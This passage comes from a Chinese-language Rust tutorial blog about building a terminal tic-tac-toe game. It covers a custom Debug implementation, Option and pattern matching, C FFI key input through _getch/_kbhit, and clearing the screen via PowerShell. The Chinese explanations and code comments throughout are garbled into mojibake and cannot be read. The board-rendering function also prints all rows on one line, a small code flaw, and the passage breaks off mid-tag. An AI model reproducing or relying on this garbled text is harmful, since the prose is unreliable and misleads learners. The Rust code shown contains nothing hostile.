&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">        <span class="string">&#x27; &#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    players: [</span><br><span class="line">        <span class="type">Player</span> &#123;</span><br><span class="line">            <span class="type">name</span>: <span class="string">&quot;Test Player&quot;</span>,</span><br><span class="line">            <span class="type">symbol</span>: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="type">Player</span> &#123;</span><br><span class="line">            <span class="type">name</span>: <span class="string">&quot;Test Player&quot;</span>,</span><br><span class="line">            <span class="type">symbol</span>: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    ],</span><br><span class="line">    current_player: <span class="number">0</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“é€‰æ‹©å“ªç§å–å†³ä½ è‡ªå·±å®é™…éœ€æ±‚ï¼Œå¦‚æœéƒ½ä¸åˆä½ èƒƒå£ï¼Œå°±å¯ä»¥è‡ªå·±å®ç°ä¸€ä¸ªDebugç‰¹å¾</p><h2 id="è‡ªå®šä¹‰Debugæ ·å¼"><a href="#è‡ªå®šä¹‰Debugæ ·å¼" class="headerlink" title="è‡ªå®šä¹‰Debugæ ·å¼"></a>è‡ªå®šä¹‰Debugæ ·å¼</h2><p>å¦‚æœå­¦è¿‡é¢å‘å¯¹è±¡ï¼Œé‚£ä¹ˆè‚¯å®šçŸ¥é“ç»§æ‰¿è¿™ä¸ªæ¦‚å¿µï¼Œä½†æ˜¯ä¸€ä¸Šæ‰‹å¯èƒ½å¾ˆå®¹æ˜“å†™å‡ºå±å±±ï¼Œè€Œä¸”ä¸å¥½ç»´æŠ¤ï¼ˆå¦‚æœä½ å¯¹æŸä¸ªåŸºç±»åšäº†ä¿®æ”¹çš„è¯ï¼‰ï¼Œè€ŒRusté€‰æ‹©æŠ›å¼ƒäº†ç»§æ‰¿è¿™ä¸€ä¸ªç³Ÿç³•çš„ç‰¹æ€§ï¼Œé€‰æ‹©å¦ä¸€ç§æ›´åŠ ä¼˜é›…çš„æ–¹å¼æ¥å®ç°ç±»çš„å¤šæ€ï¼Œä¹Ÿå°±æ˜¯traitã€‚</p><p>Traitï¼ˆç‰¹å¾ï¼‰æ˜¯ä¸ºä¸€äº›ç±»å®šä¹‰çš„ä¸€ç»„è¡Œä¸ºï¼Œå¦‚æœè¦ä¸€ä¸ªstructä½¿ç”¨æŸä¸ªç‰¹å¾çš„åŠŸèƒ½ï¼Œåªè¦ä¸ºå®ƒå®ç°è¯¥ç‰¹å¾å³å¯ï¼Œä¸€ä¸ªstructå¯ä»¥å®ç°å¤šä¸ªç‰¹å¾ã€‚æ¥çœ‹çœ‹ä¾‹å­ï¼Œæˆ‘ä»¬æ¥ä¸ºPlayerå’ŒGameå®ç°è‡ªå®šä¹‰çš„Debug</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt::&#123;<span class="built_in">Debug</span>, Formatter, <span class="type">Result</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Debug</span> <span class="keyword">for</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> Formatter&lt;<span class="symbol">&#x27;_</span>&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span> &#123;</span><br><span class="line">        <span class="built_in">write!</span>(f, <span class="string">&quot;Player &#123;&#125; with &#123;&#125;&quot;</span>, &amp;<span class="keyword">self</span>.name, &amp;<span class="keyword">self</span>.symbol)</span><br><span class="line">        <span class="comment">// æ³¨æ„ä¸è¦å¸¦åˆ†å·ï¼Œå› ä¸ºè¦è¿”å›Resultï¼Œå¸¦åˆ†å·å°±è¿”å›()äº†</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Debug</span> <span class="keyword">for</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> Formatter&lt;<span class="symbol">&#x27;_</span>&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span> &#123;</span><br><span class="line">        f.<span class="title function_ invoke__">debug_struct</span>(<span class="string">&quot;Game&quot;</span>)</span><br><span class="line">            .<span class="title function_ invoke__">field</span>(<span class="string">&quot;board&quot;</span>, &amp;<span class="built_in">format!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, &amp;<span class="keyword">self</span>.board) <span class="keyword">as</span> &amp;<span class="keyword">dyn</span> <span class="built_in">Debug</span>)</span><br><span class="line">            .<span class="title function_ invoke__">field</span>(<span class="string">&quot;players&quot;</span>, &amp;<span class="keyword">self</span>.players)</span><br><span class="line">            .<span class="title function_ invoke__">field</span>(<span class="string">&quot;current_player&quot;</span>, &amp;<span class="keyword">self</span>.current_player)</span><br><span class="line">            .<span class="title function_ invoke__">finish</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†è¿è¡Œçœ‹çœ‹å°±å‘å…ˆå˜æˆè‡ªå®šä¹‰çš„äº†ï¼Œè®°å¾—å»æ‰<code>#[derive(Debug)]</code>ï¼Œå¦åˆ™ä¼šæç¤ºä½ å®ç°Debugç‰¹å¾å†²çªäº†</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Game &#123; board: <span class="string">&quot;[&#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;]&quot;</span>, players: [<span class="type">Player</span> <span class="type">Test</span> <span class="type">Player</span> <span class="type">with</span> <span class="type">X</span>, <span class="type">Player</span> <span class="type">Test</span> <span class="type">Player</span> <span class="type">with</span> <span class="type">X</span>], current_player: <span class="number">0</span> &#125;</span><br><span class="line">Game &#123;</span><br><span class="line">    board: <span class="string">&quot;[&#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;, &#x27; &#x27;]&quot;</span>,</span><br><span class="line">    players: [</span><br><span class="line">        <span class="type">Player</span> <span class="type">Test</span> <span class="type">Player</span> <span class="type">with</span> <span class="type">X</span>,</span><br><span class="line">        <span class="type">Player</span> <span class="type">Test</span> <span class="type">Player</span> <span class="type">with</span> <span class="type">X</span>,</span><br><span class="line">    ],</span><br><span class="line">    current_player: <span class="number">0</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨Option"><a href="#ä½¿ç”¨Option" class="headerlink" title="ä½¿ç”¨Option"></a>ä½¿ç”¨Option</h2><p>æˆ‘ä»¬ä¸å¦¨æŠŠå‡½æ•°è¿ç§»åˆ°æˆ‘ä»¬å®šä¹‰çš„structå§ï¼Œä½†è¿™é‡Œå…¶å®ä¼šå‘ç°ï¼šæˆ‘ä»¬å¾ˆå¤šå‡½æ•°éƒ½æ˜¯ç›´æ¥å¯¹ä¸boardçš„æ“ä½œï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¦‚æœç›´æ¥ä¸ºGameå®ç°è¿™äº›åŠŸèƒ½ï¼Œå°±ä¼šå‘ç°éå¸¸çš„ä¸‘é™‹ï¼Œå°¤å…¶æ˜¯is_winï¼Œis_fullè¿™äº›åªç”¨åˆ°äº†boardçš„å‡½æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸ºä»€ä¹ˆä¸å®šä¹‰ä¸€ä¸ªBoardï¼Œè€ŒæŠŠè¿™éƒ¨åˆ†é€»è¾‘å°è£…åˆ°boardé‡Œé¢å‘¢ï¼Ÿ</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Board</span> &#123;</span><br><span class="line">    cells: [....]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡æˆ‘ä»¬å°±ä¸æŒ‰ç…§ä¹‹å‰çš„ä½¿ç”¨charæ•°ç»„äº†ï¼Œæˆ‘ä»¬ä½¿ç”¨charæ•°ç»„æ—¶æ˜¯ç”¨ç©ºæ ¼ä½œä¸ºåˆå§‹å€¼çš„ï¼Œä½†æ˜¯è¿™æ ·å…¶å®å¹¶ä¸å¥½<del>ï¼ˆå¦‚æœæˆ‘æƒ³ç”¨ç©ºæ ¼ä½œä¸ºç©å®¶çš„ç¬¦å·å‘¢ï¼‰</del>ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒOptionæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³åŠæ³•ï¼Optionå’ŒResultçš„å®šä¹‰å¾ˆåƒ</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Option</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(T),</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå¥½ç†è§£å§ï¼Œè¦ä¹ˆæœ‰å€¼ï¼ˆSomeï¼‰ï¼Œè¦ä¹ˆæ˜¯ç©ºï¼ˆNoneï¼‰ã€‚è¿™æ ·è®¾è®¡çš„å¥½å¤„å°±æ˜¯é¿å…äº†åƒCä¸€æ ·0å’ŒNULLå†²çªã€‚ä½ åªéœ€è¦å§Noneä½œä¸ºä¸€ä¸ªä»…ä»£è¡¨ç©ºè¿™ä¸ªæ„ä¹‰çš„ä¸œè¥¿ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬æ¥æ”¹å†™ä¸€ä¸‹board</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Board</span> &#123;</span><br><span class="line">    cells: [<span class="type">Option</span>&lt;<span class="type">char</span>&gt;; <span class="number">9</span>],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Board</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> Board &#123;</span><br><span class="line">        Board &#123; cells: [<span class="literal">None</span>; <span class="number">9</span>] &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// other function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  å› ä¸ºOptionæ˜¯è¢«æ”¾åœ¨äº†preludeæ¨¡å—ä¸­çš„ï¼Œpreludeä¼šæ”¾ä¸€ä¸‹æ¯”è¾ƒå¸¸ç”¨çš„ä¸œè¥¿ï¼Œå¯ä»¥ä¸éœ€è¦å¯¼å…¥å°±å¯ä»¥ä½¿ç”¨ã€‚è¿™é‡Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨<code>Option::None</code></p></blockquote><p>é‚£ä¹ˆè¯¥å¦‚ä½•å¤„ç†è¿™äº›å€¼å‘¢ï¼Ÿå¯ä»¥ç”¨å‰é¢ä»‹ç»çš„ <code>.unwrap()</code>ï¼Œæ¥å–å‡ºé‡Œé¢çš„å€¼ï¼Œä½†æ˜¯æ³¨æ„ï¼å¦‚æœé‡åˆ°Noneå°±ä¼šé”™è¯¯ï¼ˆå› ä¸ºNoneä»£è¡¨ç©ºçš„æ„ä¹‰ï¼Œä¹Ÿå°±æ˜¯<strong>æ²¡æœ‰å€¼</strong>ï¼Œæ‰€ä»¥å½“ç„¶unwrapä¸äº†ï¼‰ï¼Œç„¶åç¨‹åºå´©æºƒã€‚æ‰€ä»¥å‰é¢æˆ‘ä¹Ÿè¯´è¿‡<strong>unwrapé€‚åˆä½ å‡ ä¹èƒ½ç¡®å®šä¸ä¼šæŠ¥é”™çš„æƒ…å†µä¸‹</strong>ã€‚</p><h2 id="ç”¨æ¨¡å¼åŒ¹é…æ¥å¤„ç†å¼‚å¸¸"><a href="#ç”¨æ¨¡å¼åŒ¹é…æ¥å¤„ç†å¼‚å¸¸" class="headerlink" title="ç”¨æ¨¡å¼åŒ¹é…æ¥å¤„ç†å¼‚å¸¸"></a>ç”¨æ¨¡å¼åŒ¹é…æ¥å¤„ç†å¼‚å¸¸</h2><p>æ¯”å¦‚è¦å®ç°è¾“å‡ºboardï¼Œé‚£ä¹ˆå°±ä¸å¯é¿å…çš„è¦å¤„ç†Optionï¼Œé‚£ä¹ˆå°±å¯ä»¥åƒè¿™æ ·</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Board</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">render</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;+---+---+---+&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">row</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">3</span> &#123;</span><br><span class="line">            <span class="built_in">print!</span>(<span class="string">&quot;| &quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> <span class="variable">col</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">3</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> <span class="variable">cell</span> = <span class="keyword">self</span>.cells[row * <span class="number">3</span> + col];</span><br><span class="line">                <span class="keyword">match</span> cell &#123;</span><br><span class="line">                    <span class="title function_ invoke__">Some</span>(value) =&gt; <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125; | &quot;</span>, value),</span><br><span class="line">                    <span class="literal">None</span> =&gt; <span class="built_in">print!</span>(<span class="string">&quot;  | &quot;</span>),</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">println!</span>();</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;+---+---+---+&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>matchä¼šè‡ªåŠ¨åŒ¹é…åˆ°æ ¼å¼ä¸€æ ·çš„æ¨¡å¼ï¼Œå¦‚æœä½ æ˜¯Someï¼Œå°±ä¼šåŒ¹é…åˆ°ç¬¬ä¸€ç§ï¼Œå¦‚æœæ˜¯Noneå°±ä¼šåŒ¹é…åˆ°ç¬¬äºŒä¸ªã€‚è¦æ³¨æ„ï¼š<strong>matchå¿…é¡»ç©·å°½æ‰€æœ‰å¯èƒ½</strong>ï¼Œ å¦‚æœä½ æƒ³ä¸åˆ°æ›´å¤šçš„å¯èƒ½ï¼Œä½ å¯ä»¥åŒ¹é…åˆ° <code>_</code>ï¼Œ è¿™ä»£è¡¨é™¤äº†ä¸Šé¢çš„æ¨¡å¼ä»¥å¤–çš„å…¨éƒ¨æ¨¡å¼ï¼ˆå¿…é¡»æ”¾åœ¨æœ€åï¼‰ã€‚</p><p>æ¥å›å»çœ‹æˆ‘ä»¬çš„å‰é¢å†™çš„è¯»å…¥ç»ˆç«¯å†…å®¹çš„é‚£ä¸€è¡Œ <code>stdin.read_line(&amp;mut input).unwrap();</code>ï¼Œ æˆ‘ä»¬å¦‚æœä¸èƒ½ç¡®ä¿æ˜¯å¦ä¸€å®šæ²¡æœ‰é—®é¢˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨matchæ¥æ‰‹åŠ¨å¤„ç†ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä»‹ç»å¦ä¸€ç§å¸¸ç”¨çš„æ¨¡å¼åŒ¹é… <code>if let</code></p><p>å› ä¸ºå¦‚æœæ˜¯æ­£å¸¸çš„è¯æˆ‘ä»¬ä¸éœ€è¦åšé¢å¤–çš„å¤„ç†ï¼Œæ‰€æœ‰æˆ‘ä»¬åªéœ€è¦åŒ¹é…Result::Errè¿™ä¸€ç§æ¨¡å¼å°±å¯ä»¥äº†<strong>ï¼ˆåªè¦åŒ¹é…ä¸€ç§æˆ–è€…å°‘é‡çš„æ¨¡å¼ï¼Œé‚£ä¹ˆif letå°±éå¸¸é€‚åˆï¼‰</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å› ä¸ºè®©ç¨‹åºè‡ªå·±å‡ºç°å¼‚å¸¸æ¥panicçš„è¯ï¼Œä¼šè¾“å‡ºå¾ˆå¤šé¢å¤–çš„ä¸œè¥¿ï¼ˆç»™å¼€å‘è€…çœ‹çš„ï¼Œä½†æ˜¯æ˜¾ç„¶ä¸æ˜¯ç”¨æˆ·æƒ³çœ‹åˆ°çš„ï¼‰</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = stdin.<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> input) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;[Error]: &#123;&#125;&quot;</span>, e);</span><br><span class="line">    std::process::<span class="title function_ invoke__">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Move-ç§»åŠ¨-and-Move-è½å­"><a href="#Move-ç§»åŠ¨-and-Move-è½å­" class="headerlink" title="Move(ç§»åŠ¨) and Move(è½å­)"></a>Move(ç§»åŠ¨) and Move(è½å­)</h2><h3 id="ç®€å•çš„ä¸Cäº’æ“ä½œ"><a href="#ç®€å•çš„ä¸Cäº’æ“ä½œ" class="headerlink" title="ç®€å•çš„ä¸Cäº’æ“ä½œ"></a>ç®€å•çš„ä¸Cäº’æ“ä½œ</h3><p>å¦‚æœåªæ˜¯åƒåŸæ¥é‚£æ ·è¾“å…¥åæ ‡çš„è¯ä¹Ÿå¤ªéš¾å—äº†ï¼Œè¿™ä¸€ç‚¹ä¹Ÿä¸æ¸¸æˆï¼ï¼ï¼ç›¸ä¿¡è¯»è€…å¤§çˆ¹ä»¬è‚¯å®šä¸ä¼šä¹°è´¦çš„ã€‚æ‰€ä»¥æˆ‘ä»¬æ¥å®ç°ä¸€ä¸‹é€šè¿‡é”®ç›˜çš„WASDæ¥é€‰æ‹©æ£‹ç›˜çš„è½ç‚¹ï¼ˆè¿™æ ·ä¹Ÿä¸ç”¨æ‹…å¿ƒè¾“å…¥åæ ‡çš„è¶Šç•Œé—®é¢˜ï¼‰ï¼ŒSPACEæ¥ç¡®å®šè½å­ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦æ¯æ¬¡æŒ‰é”®åï¼Œç¨‹åºéƒ½èƒ½åŠæ—¶ååº”ã€‚ä½†æ˜¯Rustæ²¡æœ‰ç›´æ¥æä¾›ä¸€ä¸ªç±»ä¼¼äºCçš„getchæ–¹æ³•ï¼Œå½“ç„¶è¿˜æœ‰ç¬¬ä¸‰æ–¹åº“å¯ä»¥å®ç°æŒ‰é”®ç›‘æ§ï¼Œä¸è¿‡è¿™é‡Œä¸ºäº†ä»‹ç»ä¸Cäº’æ“ä½œæ‰€ä»¥é€‰æ‹©äº†è°ƒç”¨C APIã€‚</p><p>æˆ‘ä»¬éœ€è¦ä½¿ç”¨externå…³é”®å­—</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªgetchç”¨æ¥æ¥æ”¶æŒ‰é”®ï¼Œå’Œä¸€ä¸ªkbhitç›‘æµ‹æ˜¯å¦æœ‰æŒ‰é”®äº‹ä»¶ã€‚åœ¨externä¸­å®šä¹‰æ¥å£</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">_getch</span>() <span class="punctuation">-&gt;</span> <span class="type">u8</span>;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">_kbhit</span>() <span class="punctuation">-&gt;</span> <span class="type">bool</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥å°è£…ä¸€ä¸ªæŒ‰é”®ç›‘æ§çš„å‡½æ•°äº†ï¼Œè¦æ³¨æ„ffiæ˜¯ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥ä»£ç å¿…é¡»ç”¨unsafeåŒ…è£¹ï¼Œï¼ˆæˆ–è€…æŠŠå‡½æ•°å£°æ˜ä¸ºunsafeï¼Œä½†æ˜¯è¿™ä¼šå¯¼è‡´æ¯æ¬¡è°ƒç”¨éƒ½å¾—ä½¿ç”¨unsafeï¼‰</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">getch</span>(on_block: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="type">u8</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="comment">// è®¾ç½®äº†ä¸€ä¸ªon_blockæ¥æŒ‡ç¤ºæ˜¯å¦é˜»å¡ï¼Œtrueå°±ä¼šç­‰å¾…æŒ‰ä¸‹</span></span><br><span class="line">        <span class="keyword">if</span> on_block || _kbhit() &#123;</span><br><span class="line">            <span class="title function_ invoke__">Some</span>(_getch())</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="literal">None</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠåŸæ¥çš„mainé‡Œé¢çš„é€»è¾‘è¿ç§»åˆ°Gameçš„runæ–¹æ³•é‡Œï¼Œä¸ºäº†æä¾›ä¸€ä¸ªæ›´è‰¯å¥½çš„æ¸¸æˆç¯å¢ƒï¼Œä½ åšäº†ä¸€ä¸ªå†³å®šæ˜¯æ¸…ç©ºå±å¹•ï¼</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::process::Command;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="comment">// other fn</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">run</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;you can use WASD to move the cursor, and press &lt;SPACE&gt; to place the symbol.&quot;</span>);</span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;We will clear the screen before start.\nAre you sure to start? (Y/n): &quot;</span>);</span><br><span class="line">        std::io::<span class="title function_ invoke__">stdout</span>().<span class="title function_ invoke__">flush</span>().<span class="title function_ invoke__">unwrap</span>();<span class="comment">// åˆ·æ–°ç¼“å†²åŒºï¼Œå¦åˆ™ä¼šåœ¨è¾“å…¥åæ‰è¾“å…¥print!é‡Œé¢çš„ä¸œè¥¿</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">opt</span> = <span class="title function_ invoke__">getch</span>(<span class="literal">true</span>);<span class="comment">// ç­‰å¾…è¾“å…¥</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(opt) = opt &#123;</span><br><span class="line">            <span class="keyword">if</span> !matches!(opt <span class="keyword">as</span> <span class="type">char</span>, <span class="string">&#x27;Y&#x27;</span>|<span class="string">&#x27;y&#x27;</span>|<span class="string">&#x27;\r&#x27;</span>|<span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Command::<span class="title function_ invoke__">new</span>(<span class="string">&quot;Powershell&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">args</span>(&amp;[<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cls&quot;</span>])</span><br><span class="line">        .<span class="title function_ invoke__">status</span>()</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to clear screen&quot;</span>);</span><br><span class="line">        <span class="keyword">loop</span> &#123;</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå¤„ç†è¾“å…¥ï¼Œç»™Gameæ·»åŠ ä¸€ä¸ª<code>current_pos: usize</code>è®°å½•å½“å‰ä½ç½®ï¼ˆè®°å¾—æ”¹newï¼‰</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in loop</span></span><br><span class="line"><span class="keyword">self</span>.board.<span class="title function_ invoke__">render</span>();</span><br><span class="line"><span class="keyword">let</span> <span class="variable">opt</span> = <span class="title function_ invoke__">getch</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">match</span> opt &#123;</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(opt) =&gt; <span class="keyword">match</span> opt &#123;</span><br><span class="line">        <span class="string">b&#x27;q&#x27;</span> =&gt; <span class="keyword">break</span>,</span><br><span class="line">        <span class="string">b&#x27;w&#x27;</span> =&gt; <span class="keyword">if</span> <span class="keyword">self</span>.current_pos &gt;= <span class="number">3</span> &#123; <span class="keyword">self</span>.current_pos -= <span class="number">3</span> &#125;,</span><br><span class="line">        <span class="string">b&#x27;s&#x27;</span> =&gt; <span class="keyword">if</span> <span class="keyword">self</span>.current_pos &lt; <span class="number">6</span> &#123; <span class="keyword">self</span>.current_pos += <span class="number">3</span> &#125;,</span><br><span class="line">        <span class="string">b&#x27;a&#x27;</span> =&gt; <span class="keyword">if</span> <span class="keyword">self</span>.current_pos % <span class="number">3</span> &gt; <span class="number">0</span> &#123; <span class="keyword">self</span>.current_pos -= <span class="number">1</span> &#125;,</span><br><span class="line">        <span class="string">b&#x27;d&#x27;</span> =&gt; <span class="keyword">if</span> <span class="keyword">self</span>.current_pos % <span class="number">3</span> &lt; <span class="number">2</span> &#123; <span class="keyword">self</span>.current_pos += <span class="number">1</span> &#125;,</span><br><span class="line">        <span class="string">b&#x27; &#x27;</span> =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> <span 